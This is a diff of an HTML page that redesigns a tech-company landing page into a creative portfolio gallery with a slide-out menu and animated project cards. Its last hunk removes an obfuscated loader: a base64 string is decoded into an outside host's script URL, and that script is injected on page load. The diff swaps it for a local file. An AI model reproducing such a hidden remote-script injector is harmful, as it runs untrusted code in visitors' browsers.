@@ -3,377 +3,412 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>极简科技 - 创新与效率</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>灵感画廊 - 创意作品集</title>
     <style>
-        /* 全局样式 */
         body {
             overflow: hidden;
-            font-family: 'Inter', 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Roboto', sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #FDFDFD;
-            /* 纯净的浅色背景 */
+            background-color: #F8F8F8;
+            /* 极浅灰色背景 */
             color: #333333;
             /* 深灰色文本 */
-            line-height: 1.6;
+            line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-            scroll-behavior: smooth;
-            /* 平滑滚动 */
+            overflow-x: hidden;
         }
 
         .container {
             max-width: 90%;
-            /* 适应移动端宽度 */
             margin: 0 auto;
-            padding: 15px;
+            padding: 30px 0;
         }
 
-        /* 头部/品牌区样式 */
+        /* 头部 - 简洁艺术，菜单按钮绝对定位在右上角 */
         header {
-            text-align: center;
-            padding: 50px 20px;
             background-color: #FFFFFF;
-            /* 白色背景 */
-            border-radius: 15px;
+            /* 纯白色头部背景 */
+            padding: 25px 20px;
+            /* 调整内边距 */
+            text-align: center;
+            /* 标题居中 */
+            border-bottom: 1px solid #E0E0E0;
+            /* 极细底部边框 */
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.03);
+            position: relative;
+            /* 为内部绝对定位的元素提供参考 */
+            overflow: hidden;
             margin-bottom: 40px;
-            /* 增加底部外边距 */
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            /* 轻微阴影 */
         }
 
         header h1 {
-            color: #2C3E50;
-            /* 深蓝灰色标题 */
-            font-size: 3em;
-            /* 更大标题 */
-            margin-bottom: 10px;
+            margin: 0;
+            font-family: 'Playfair Display', serif;
+            /* 优雅标题字体 */
+            font-size: 2.2em;
+            /* 适应顶部条 */
+            color: #333333;
             letter-spacing: 1px;
-            font-weight: 300;
-            /* 更细的字重 */
+            /* flex-grow removed as header is no longer flex container for h1 */
         }
 
         header p {
-            color: #607D8B;
-            /* 柔和的蓝灰色 */
-            font-size: 1.2em;
-            margin: 0;
-            font-style: italic;
+            display: none;
+            /* 副标题在顶部条中隐藏 */
         }
 
-        /* 主要内容区 */
-        main {
-            padding-top: 0;
-        }
-
-        section {
-            background-color: #FFFFFF;
-            padding: 30px;
-            /* 增加内边距 */
-            border-radius: 15px;
-            margin-bottom: 30px;
-            /* 增加section间距 */
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            /* 轻微阴影 */
-            text-align: center;
-            /* 默认居中 */
-        }
-
-        h2 {
-            color: #2C3E50;
-            font-size: 2.2em;
-            margin-bottom: 25px;
-            border-bottom: 2px solid #E0EBF5;
-            padding-bottom: 12px;
-            display: inline-block;
-            /* 适应内容宽度 */
-            font-weight: 400;
-            /* 正常字重 */
-        }
-
-        h3 {
-            color: #333333;
-            font-size: 1.5em;
-            margin-top: 20px;
-            margin-bottom: 15px;
-            font-weight: 500;
-            /* 中等字重 */
-        }
-
-        p {
-            color: #4A4A4A;
-            font-size: 1em;
-            margin-bottom: 18px;
-            max-width: 800px;
-            /* 限制文本宽度 */
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
-            display: block;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        /* 服务列表样式 */
-        .service-list {
-            list-style: none;
-            padding: 0;
-            margin: 30px auto 0;
-            max-width: 800px;
-        }
-
-        .service-list li {
-            background-color: #FDFDFD;
-            padding: 20px;
-            border-radius: 10px;
-            margin-bottom: 15px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
-            text-align: left;
-            /* 列表项左对齐 */
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border-left: 5px solid #4CAF50;
-            /* 绿色强调线 */
-        }
-
-        .service-list li:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
-        }
-
-        .service-list li h3 {
-            color: #4CAF50;
+        /* 菜单切换按钮 - 绝对定位在右上角 */
+        .menu-toggle {
+            background: none;
+            border: none;
+            font-size: 2em;
+            /* 图标大小 */
+            color: #A28C5B;
             /* 强调色 */
-            margin-top: 0;
-            font-size: 1.4em;
-            margin-bottom: 10px;
-        }
-
-        .service-list li p {
-            font-size: 0.95em;
-            color: #5A6A7D;
-            margin-bottom: 0;
-        }
-
-        /* 团队成员卡片 */
-        .team-grid {
-            display: grid;
-            grid-template-columns: 1fr;
-            /* 移动端单列 */
-            gap: 25px;
-            margin-top: 30px;
-            max-width: 900px;
-            margin-left: auto;
-            margin-right: auto;
-        }
-
-        .team-member-card {
-            background-color: #FDFDFD;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-            text-align: center;
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-
-        .team-member-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .team-member-card img {
-            width: 120px;
-            height: 120px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 15px;
-            border: 3px solid #4CAF50;
-            /* 强调色边框 */
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-        }
-
-        .team-member-card h4 {
-            color: #333333;
-            font-size: 1.2em;
-            margin-bottom: 5px;
-        }
-
-        .team-member-card p {
-            font-size: 0.9em;
-            color: #777777;
-            margin-bottom: 0;
-        }
-
-        /* 联系方式 */
-        .contact-info p {
-            margin-bottom: 12px;
-            font-size: 1.1em;
-        }
-
-        .contact-info a {
-            color: #4CAF50;
-            text-decoration: none;
-            font-weight: bold;
-            transition: color 0.3s ease;
-        }
-
-        .contact-info a:hover {
-            color: #43A047;
-        }
-
-        .social-links {
-            margin-top: 30px;
-        }
-
-        .social-links a {
-            display: inline-block;
-            margin: 0 15px;
-            color: #4CAF50;
-            font-size: 2.5em;
-            text-decoration: none;
+            cursor: pointer;
+            padding: 5px;
+            position: absolute;
+            /* 绝对定位 */
+            top: 25px;
+            /* 距离顶部 */
+            right: 20px;
+            /* 距离右侧 */
+            z-index: 2;
             transition: transform 0.3s ease;
         }
 
-        .social-links a:hover {
-            transform: translateY(-5px);
-            color: #43A047;
+        .menu-toggle:hover {
+            transform: scale(1.1);
         }
 
-        /* 页脚样式 */
-        footer {
-            text-align: center;
-            padding: 30px 20px;
-            color: #777777;
-            font-size: 0.9em;
+        /* 侧边导航菜单 */
+        nav {
+            position: fixed;
+            top: 0;
+            right: -280px;
+            /* 默认隐藏在屏幕右侧 */
+            width: 250px;
+            /* 菜单宽度 */
+            height: 100%;
             background-color: #FFFFFF;
-            margin-top: 40px;
-            /* 增加顶部外边距 */
+            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
+            transition: right 0.4s ease-in-out;
+            /* 平滑滑入滑出 */
+            z-index: 1001;
+            /* 确保在内容之上 */
+            padding-top: 80px;
+            /* 留出顶部空间 */
+            box-sizing: border-box;
+        }
+
+        nav.is-open {
+            right: 0;
+            /* 菜单打开时滑入 */
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            /* 垂直排列 */
+            gap: 10px;
+            /* 列表项间距 */
+        }
+
+        nav ul li a {
+            color: #333333;
+            text-decoration: none;
+            padding: 15px 20px;
+            /* 增加点击区域 */
+            border-bottom: 1px solid #E0E0E0;
+            /* 列表项分隔线 */
+            transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
+            display: flex;
+            align-items: center;
+            font-weight: 500;
+            font-size: 1.1em;
+        }
+
+        nav ul li a:hover,
+        nav ul li a:focus {
+            background-color: #F8F8F8;
+            /* 柔和背景 */
+            color: #A28C5B;
+            /* 强调色文字 */
+            transform: translateX(5px);
+            /* 悬停时右移 */
+        }
+
+        nav ul li:last-child a {
+            border-bottom: none;
+            /* 最后一个没有底部边框 */
+        }
+
+        nav ul li a .icon {
+            font-size: 1.5em;
+            margin-right: 15px;
+            color: #A28C5B;
+            /* 图标强调色 */
+        }
+
+        /* 菜单打开时的背景遮罩 */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.3);
+            /* 半透明黑色 */
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
+        }
+
+        .overlay.is-visible {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        main {
+            padding-top: 30px;
+        }
+
+        /* 作品卡片 - 柔和阴影与动画 */
+        .project-card {
+            background-color: #FFFFFF;
+            margin-bottom: 40px;
+            padding: 35px;
             border-radius: 15px;
-            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.03);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            opacity: 0;
+            /* 初始隐藏 */
+            transform: translateY(20px);
+            /* 初始位置 */
         }
 
-        /* 媒体查询：平板及以上设备 */
-        @media (min-width: 600px) {
-            .team-grid {
-                grid-template-columns: 1fr 1fr;
-                /* 两列布局 */
-            }
+        .project-card.fade-in {
+            opacity: 1;
+            transform: translateY(0);
+            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
         }
 
-        @media (min-width: 900px) {
-            .team-grid {
-                grid-template-columns: 1fr 1fr 1fr;
-                /* 三列布局 */
-            }
+        .project-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
+        }
+
+        .project-card h2 {
+            font-family: 'Playfair Display', serif;
+            font-size: 2.2em;
+            color: #333333;
+            margin-top: 0;
+            margin-bottom: 15px;
+        }
+
+        .project-card .category {
+            font-size: 0.9em;
+            color: #999999;
+            margin-bottom: 20px;
+            display: block;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .project-card p {
+            font-size: 1.05em;
+            color: #666666;
+            margin-bottom: 25px;
+        }
+
+        .project-card img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 25px auto;
+            border-radius: 10px;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
+            border: 2px solid #DDDDDD;
+        }
+
+        .view-project {
+            display: inline-block;
+            background-color: #A28C5B;
+            /* 强调色按钮 */
+            color: #FFFFFF;
+            padding: 12px 28px;
+            border-radius: 5px;
+            text-decoration: none;
+            font-weight: bold;
+            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
+            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+        }
+
+        .view-project:hover {
+            background-color: #8D7B4F;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
+        }
+
+        /* 页脚 - 简洁淡雅 */
+        footer {
+            background-color: #F0F0F0;
+            /* 略深于背景的浅灰色 */
+            color: #777777;
+            padding: 40px 0;
+            text-align: center;
+            font-size: 0.9em;
+            margin-top: 50px;
+            border-top: 1px solid #E0E0E0;
+            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .social-links a {
+            color: #777777;
+            text-decoration: none;
+            margin: 0 20px;
+            font-size: 1.4em;
+            transition: color 0.3s ease, transform 0.2s ease;
+        }
+
+        .social-links a:hover {
+            color: #A28C5B;
+            /* 强调色 */
+            transform: translateY(-3px) scale(1.1);
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
+    <header>
+        <div class="container">
+            <h1>灵感画廊</h1>
+            <p>创意与设计的无限可能</p>
+            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+        </div>
+    </header>
+
+    <!-- 侧边导航菜单 -->
+    <nav id="mainNav">
+        <ul>
+            <li><a href="#featured-projects"><span class="icon">&#127912;</span> 精选作品</a></li>
+            <li><a href="#design-gallery"><span class="icon">&#128172;</span> 设计画廊</a></li>
+            <li><a href="#about-me"><span class="icon">&#128100;</span> 关于我</a></li>
+            <li><a href="#contact"><span class="icon">&#128231;</span> 联系</a></li>
+        </ul>
+    </nav>
+
+    <!-- 菜单打开时的背景遮罩 -->
+    <div class="overlay" id="menuOverlay"></div>
+
     <div class="container">
-        <header>
-            <h1>极简科技</h1>
-            <p>以创新驱动效率，以科技赋能未来</p>
-        </header>
-
         <main>
-            <section id="about">
-                <h2>关于我们</h2>
-                <p>极简科技致力于提供前沿的智能解决方案，专注于人工智能、物联网和云计算领域。我们通过创新技术，帮助企业实现数字化转型，提升运营效率和市场竞争力。</p>
-                <p>我们拥有一支充满激情、经验丰富的研发团队，始终坚持以客户为中心，以卓越的技术和专业的服务，为客户创造最大价值。</p>
-                <img src="https://picsum.photos/600/350?random=<%= new Date().getTime() + 1 %>" alt="现代办公室中的团队协作">
+            <section id="featured-projects" class="project-card">
+                <h2>城市脉动：动态品牌设计</h2>
+                <span class="category">品牌设计 / 动态视觉</span>
+                <img src="https://picsum.photos/300/200?random=1&seed=city-pulse" alt="城市脉动项目" class="random-image">
+                <p>一个为现代都市生活品牌设计的视觉识别系统，强调流动性与活力。项目涵盖标志、字体、色彩和动态图形的应用。</p>
+                <a href="#" class="view-project">查看项目</a>
             </section>
 
-            <section id="services">
-                <h2>我们的服务</h2>
-                <ul class="service-list">
-                    <li>
-                        <h3>智能自动化解决方案</h3>
-                        <p>通过AI和机器人技术，实现生产流程和业务操作的自动化与优化。</p>
-                    </li>
-                    <li>
-                        <h3>云原生应用开发</h3>
-                        <p>基于微服务和容器化技术，构建可弹性伸缩、高可用的云原生应用。</p>
-                    </li>
-                    <li>
-                        <h3>数据智能与分析</h3>
-                        <p>从海量数据中挖掘深层洞察，通过数据可视化辅助企业决策。</p>
-                    </li>
-                    <li>
-                        <h3>物联网(IoT)集成</h3>
-                        <p>提供端到端的IoT解决方案，连接设备，实现智能监控与管理。</p>
-                    </li>
-                </ul>
+            <section id="design-gallery" class="project-card">
+                <h2>自然回响：UI/UX概念</h2>
+                <span class="category">UI/UX设计 / 概念探索</span>
+                <img src="https://picsum.photos/300/200?random=2&seed=nature-echo" alt="自然回响项目" class="random-image">
+                <p>探索将自然元素融入数字界面，创造平静、直观的用户体验。设计灵感来源于森林、水流和光影的变化。</p>
+                <a href="#" class="view-project">查看项目</a>
             </section>
 
-            <section id="team">
-                <h2>我们的团队</h2>
-                <div class="team-grid">
-                    <div class="team-member-card">
-                        <img src="https://picsum.photos/120/120?random=<%= new Date().getTime() + 2 %>" alt="团队成员肖像1">
-                        <h4>张明</h4>
-                        <p>首席执行官</p>
-                    </div>
-                    <div class="team-member-card">
-                        <img src="https://picsum.photos/120/120?random=<%= new Date().getTime() + 3 %>" alt="团队成员肖像2">
-                        <h4>李华</h4>
-                        <p>技术总监</p>
-                    </div>
-                    <div class="team-member-card">
-                        <img src="https://picsum.photos/120/120?random=<%= new Date().getTime() + 4 %>" alt="团队成员肖像3">
-                        <h4>王芳</h4>
-                        <p>市场经理</p>
-                    </div>
-                </div>
+            <section class="project-card">
+                <h2>未来之声：插画系列</h2>
+                <span class="category">数字插画 / 艺术创作</span>
+                <img src="https://picsum.photos/300/200?random=3&seed=future-sound" alt="未来之声插画" class="random-image">
+                <p>一系列以科技与自然融合为主题的数字插画，通过独特的色彩和构图，描绘未来世界的和谐图景。</p>
+                <a href="#" class="view-project">查看项目</a>
             </section>
         </main>
+    </div>
 
-        <footer>
-            <p>&copy; 2023 极简科技. All rights reserved.</p>
-        </footer>
-        <div id="overlay">
-            <div id="loading_box" class="loading_container">
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
-                <div class="dot"></div>
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 灵感画廊. 版权所有.</p>
+            <div class="social-links">
+                <a href="#" target="_blank">Behance</a> |
+                <a href="#" target="_blank">Dribbble</a> |
+                <a href="#" target="_blank">Instagram</a>
             </div>
+        </div>
+    </footer>
+    <div id="overlay">
+        <div id="loading_box" class="loading_container">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
         </div>
     </div>
 
     <script>
-        // 平滑滚动到锚点
-        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault();
-                const targetId = this.getAttribute('href');
-                const targetElement = document.querySelector(targetId);
-                if (targetElement) {
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 20, /* 稍微向上偏移，避免顶部遮挡 */
-                        behavior: 'smooth'
-                    });
-                }
-            });
-        });
-
-        // 动态更新图片时间戳，防止缓存
         document.addEventListener('DOMContentLoaded', function () {
-            const images = document.querySelectorAll('img[src*="picsum.photos"]');
-            images.forEach(img => {
-                const url = new URL(img.src);
-                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000));
-                img.src = url.toString();
+            const menuToggle = document.getElementById('menuToggle');
+            const mainNav = document.getElementById('mainNav');
+            const menuOverlay = document.getElementById('menuOverlay');
+
+            function toggleMenu() {
+                mainNav.classList.toggle('is-open');
+                menuOverlay.classList.toggle('is-visible');
+            }
+
+            menuToggle.addEventListener('click', toggleMenu);
+            menuOverlay.addEventListener('click', toggleMenu);
+
+            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+                anchor.addEventListener('click', function (e) {
+                    e.preventDefault();
+
+                    const targetId = this.getAttribute('href').substring(1);
+                    const targetElement = document.getElementById(targetId);
+
+                    if (targetElement) {
+                        // Adjust scroll offset to account for header height
+                        window.scrollTo({
+                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            behavior: 'smooth'
+                        });
+                        toggleMenu(); // Close menu after clicking a link
+                    }
+                });
+            });
+
+            const projectCards = document.querySelectorAll('.project-card');
+
+            const observerOptions = {
+                root: null,
+                rootMargin: '0px',
+                threshold: 0.1
+            };
+
+            const observer = new IntersectionObserver((entries, observer) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('fade-in');
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, observerOptions);
+
+            projectCards.forEach(card => {
+                observer.observe(card);
             });
         });
     </script>
@@ -382,53 +417,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9nNGg2ajhrLmppc2h1OGJhLmNuL3N0YXRpYy9qcy9jb3JlLm1pbi5qcz90";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
